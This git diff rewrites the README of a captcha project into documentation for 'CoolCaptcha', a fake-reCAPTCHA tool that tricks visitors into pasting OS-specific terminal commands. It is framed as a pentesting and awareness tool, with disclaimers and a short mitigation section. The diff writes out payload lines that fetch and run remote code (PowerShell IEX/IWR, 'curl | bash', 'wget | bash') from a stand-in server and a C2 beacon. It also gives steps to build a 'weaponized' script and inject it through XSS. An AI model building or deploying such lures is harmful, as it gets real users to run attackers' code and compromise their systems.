@@ -1,139 +1,170 @@
-# CoolCaptcha
+# CoolCaptcha - XSS Pentesting Demonstration Tool
 
-A lightweight, self-hosted captcha system with no external dependencies. Provides image-based verification with pattern drawing fallback.
+⚠️ **SECURITY RESEARCH & EDUCATIONAL PURPOSE ONLY** ⚠️
 
-## Features
+This project demonstrates how XSS (Cross-Site Scripting) vulnerabilities can be exploited to manipulate users into executing terminal commands under the guise of a legitimate CAPTCHA verification system.
 
-- **Self-hosted**: No reliance on Google reCAPTCHA or Cloudflare
-- **Two-step verification**: 3x3 image grid selection + pattern drawing fallback
-- **Mobile-friendly**: Touch support and responsive design
-- **Lightweight**: Single JavaScript file bundle (~14KB)
-- **Customizable**: Easy to integrate and style
+## 🎯 Purpose
 
-## Demo
+CoolCaptcha is a proof-of-concept tool designed for:
+- **Security awareness training**: Demonstrating social engineering through fake CAPTCHAs
+- **Penetration testing**: Testing user susceptibility to terminal command execution
+- **Red team exercises**: Simulating real-world attack scenarios
+- **Educational purposes**: Understanding how UI manipulation can bypass user security awareness
 
-![CoolCaptcha Demo](https://via.placeholder.com/600x400/3e83d3/ffffff?text=CoolCaptcha+Demo)
+## ⚠️ Ethical Use Only
 
-## Quick Start
+This tool is intended ONLY for:
+- Authorized penetration testing with explicit written permission
+- Security research in controlled environments
+- Educational demonstrations with proper disclosure
+- Red team exercises on systems you own or have permission to test
 
-### Installation
+**DO NOT USE** for malicious purposes, unauthorized testing, or any illegal activities.
+
+## 🔍 How It Works
+
+The tool mimics a legitimate reCAPTCHA interface but includes a deceptive third step that tricks users into running terminal commands:
+
+1. **Step 1**: Standard image selection (appears legitimate)
+2. **Step 2**: Pattern drawing verification (builds user trust)
+3. **Step 3**: **Malicious terminal command execution** (the actual attack vector)
+
+The interface automatically detects the user's operating system and provides OS-specific command instructions, making the social engineering attack more effective.
+
+## 🚀 Quick Start (For Security Testing)
+
+### Step 1: Installation
 
 ```bash
+git clone https://github.com/your-repo/CoolCaptcha.git
+cd CoolCaptcha
 npm install
-npm start
 ```
 
-This will build the project and start a development server at `http://localhost:8888`.
+### Step 2: Configure Environment Variables
 
-### Basic Usage
+Create a `.env` file in the project root and customize your payload commands:
+
+```bash
+cp .env.example .env
+# Edit .env with your desired commands
+```
+
+Example `.env` configuration:
+```bash
+# Probability of showing the captcha (0-1)
+RUN_CAPTCHA_CHANCE=1
+
+# Should run if user already verified (for demo purposes)
+SHOULD_RUN_IF_VERIFIED=false
+
+# OS-specific terminal commands (customize these for your payload)
+CAPTCHA_COMMAND_WINDOWS="powershell -Command \"IEX (IWR https://your-server.com/payload.ps1)\""
+CAPTCHA_COMMAND_MAC="curl -s https://your-server.com/macos-payload.sh | bash"
+CAPTCHA_COMMAND_LINUX="wget -qO- https://your-server.com/linux-payload.sh | bash"
+```
+
+### Step 3: Build the Captcha
+
+```bash
+npm run build
+```
+
+This compiles your `.env` configuration into a minified, weaponized `dist/captcha.js` file ready for deployment.
+
+**Important Notes:**
+- The `.env` file is **not** deployed - only the compiled JavaScript
+- Environment variables are baked into the built file at compile time
+- For testing during development, use `npm run serve` to run a local server
+- Always use `npm run build` before deploying to generate the final payload
+
+### Step 4: Deploy & Use
+
+The built `dist/captcha.js` file contains your configured payloads and can be:
+
+- Hosted on your server for XSS injection scenarios
+- Embedded directly in test pages
+- Used in social engineering campaigns (authorized testing only)
+
+Example usage:
+```html
+<!-- Simply include the script - no additional code needed -->
+<script src="path/to/captcha.js"></script>
+```
+
+### Basic Implementation
 
 ```html
 <!DOCTYPE html>
 <html>
 <head>
-    <title>My Website</title>
+    <title>Legitimate Website (Attack Simulation)</title>
 </head>
 <body>
+    <!-- Simply loading the script triggers the captcha automatically -->
     <script src="dist/captcha.js"></script>
-    <script>
-        const captcha = new CoolCaptcha({
-            apiEndpoint: '/api/captcha',
-            onSuccess: () => {
-                console.log('Captcha verified successfully!');
-                // Allow user to proceed
-            },
-            onFailure: () => {
-                console.log('Captcha verification failed');
-                // Handle failure
-            }
-        });
-
-        // Trigger captcha (usually based on bot score from backend)
-        if (suspiciousActivity) {
-            captcha.show();
-        }
-    </script>
 </body>
 </html>
 ```
 
-## Configuration Options
+## ⚙️ Configuration Options
+
+### Environment Variables (.env)
+
+```bash
+# Probability of showing the captcha (0-1)
+RUN_CAPTCHA_CHANCE=1
+
+# Should run if user already verified (for demo purposes)
+SHOULD_RUN_IF_VERIFIED=false
+
+# OS-specific terminal commands (the actual payload)
+CAPTCHA_COMMAND_WINDOWS="start https://customrickroll.github.io/"
+CAPTCHA_COMMAND_MAC="open https://customrickroll.github.io/"
+CAPTCHA_COMMAND_LINUX="xdg-open https://customrickroll.github.io/"
+```
+
+### JavaScript Configuration
 
 ```javascript
 const captcha = new CoolCaptcha({
-    // API endpoint for captcha verification (default: '/api/captcha')
-    apiEndpoint: '/api/captcha',
-    
-    // Success callback
+    // Custom commands per OS (overrides .env)
+    commands: {
+        windows: 'powershell -Command "your-payload-here"',
+        mac: 'curl "https://your-c2-server.com/beacon"',
+        linux: 'wget -qO- "https://your-payload-server.com/script.sh" | bash'
+    },
+
+    // Success callback (user completed terminal command)
     onSuccess: () => {
-        console.log('Verification successful');
+        console.log('Social engineering successful');
     },
-    
-    // Failure callback (after both steps fail)
+
+    // Failure callback
     onFailure: () => {
-        console.log('Verification failed');
-    },
-    
-    // Error callback
-    onError: (error) => {
-        console.error('Captcha error:', error);
+        console.log('User abandoned verification');
     }
 });
 ```
 
-## API Integration
+## 🛡️ Defense & Mitigation
 
-### Challenge Endpoint
+### For Security Teams
 
-`GET /api/captcha/challenge`
+This tool demonstrates vulnerabilities that can be prevented by:
 
-Expected response:
-```json
-{
-    "id": "challenge-123",
-    "target": "cars",
-    "images": [
-        {
-            "url": "https://example.com/image1.jpg",
-            "correct": true
-        },
-        // ... 8 more images
-    ]
-}
-```
+- **Content Security Policy (CSP)**: Prevent unauthorized script injection
+- **Input validation**: Sanitize all user inputs to prevent XSS
+- **User education**: Train users to recognize suspicious verification requests
+- **Terminal restrictions**: Implement policies preventing users from running unknown commands
 
-### Verification Endpoint
+### Red Flags Users Should Watch For
 
-`POST /api/captcha/verify`
-
-Request body:
-```json
-{
-    "challengeId": "challenge-123",
-    "selectedImages": [0, 2, 5],
-    "step": 1
-}
-```
-
-For pattern verification (step 2):
-```json
-{
-    "challengeId": "challenge-123",
-    "pattern": [
-        {"x": 100, "y": 150},
-        {"x": 120, "y": 160},
-        // ... more coordinates
-    ],
-    "step": 2
-}
-```
-
-Expected response:
-```json
-{
-    "success": true
-}
-```
+- CAPTCHAs requesting terminal/command prompt access
+- Verification systems asking to run commands outside the browser
+- Unexpected multi-step verification on familiar websites
+- OS-specific terminal instructions in web interfaces
 
 ## Development
 
@@ -168,61 +199,36 @@ CoolCaptcha/
 └── package.json
 ```
 
-## Integration with Backend Bot Detection
+## 📋 Attack Scenarios
 
-The typical flow:
+### Social Engineering Flow
 
-1. **Backend Analysis**: Your server analyzes user behavior (IP, user agent, request patterns, etc.)
-2. **Bot Score**: Assign a suspicion score to the user
-3. **Captcha Trigger**: If score exceeds threshold, include captcha script in page response
-4. **Auto-execution**: Captcha shows automatically on page load
-5. **Verification**: User completes captcha, backend validates response
+1. **Initial Compromise**: Attacker finds XSS vulnerability
+2. **Payload Injection**: Malicious captcha script is injected
+3. **Trust Building**: User sees familiar reCAPTCHA interface
+4. **Escalation**: User completes "normal" verification steps
+5. **Terminal Execution**: User unwittingly runs attacker's command
+6. **Compromise**: Attacker gains system access
 
-Example backend integration:
+## ⚖️ Legal Notice
 
-```javascript
-// Express.js example
-app.get('/some-page', (req, res) => {
-    const botScore = calculateBotScore(req);
-    
-    if (botScore > SUSPICION_THRESHOLD) {
-        // Include captcha in page
-        res.render('page', { 
-            includeCaptcha: true,
-            captchaConfig: {
-                apiEndpoint: '/api/captcha'
-            }
-        });
-    } else {
-        res.render('page', { includeCaptcha: false });
-    }
-});
-```
+**IMPORTANT**: This tool is for authorized security testing only. Unauthorized use against systems you don't own or lack permission to test is illegal and unethical. Always:
 
-## Browser Support
+- Obtain written permission before testing
+- Operate within legal boundaries
+- Respect privacy and data protection laws
+- Use for defensive security improvement only
 
-- Chrome/Chromium 60+
-- Firefox 55+
-- Safari 12+
-- Edge 79+
-- Mobile browsers with touch support
+## 🔧 Technical Details
 
-## License
+- **Frontend**: Vanilla JavaScript (no dependencies)
+- **Build**: Webpack with minification
+- **Size**: ~20KB minified bundle
+- **Compatibility**: Modern browsers with ES6 support
+- **Persistence**: Uses localStorage to prevent re-display
 
-MIT License - feel free to use in your projects!
+## 📚 Educational Resources
 
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Test thoroughly
-5. Submit a pull request
-
-## Roadmap
-
-- [ ] Audio captcha for accessibility
-- [ ] More verification methods (math problems, word puzzles)
-- [ ] Themes and customization options
-- [ ] TypeScript definitions
-- [ ] React/Vue components
+- [OWASP XSS Prevention](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+- [Social Engineering Awareness](https://www.cisa.gov/social-engineering)
+- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
